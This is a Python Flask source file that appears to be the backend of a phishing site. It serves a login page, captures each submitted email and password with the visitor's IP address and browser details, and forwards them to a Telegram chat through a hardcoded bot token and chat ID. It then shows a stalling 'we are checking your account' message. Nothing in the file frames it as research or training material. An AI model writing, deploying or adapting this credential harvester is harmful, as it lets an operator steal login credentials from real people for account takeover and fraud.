from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# --- Telegram Info ---
BOT_TOKEN = "7901711799:AAEWnySjRO5KgEMpUQmz7fwnYzlumt_AlX4"
CHAT_ID = "6908281054"

@app.route('/')
def index():
    return render_template("login.html")

@app.route('/token', methods=['POST'])
def token():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Send to Telegram
    message = f"""
🔐 New Login Attempt:
📧 Email: {email}
🔑 Password: {password}
🌐 IP: {ip}
🧭 Device: {user_agent}
    """.strip()

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': message})

    return f"""
    <h2>Welcome, {email}</h2>
    <p>We are checking your account...</p>
    <a href='/'>← Go back</a>
    """

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
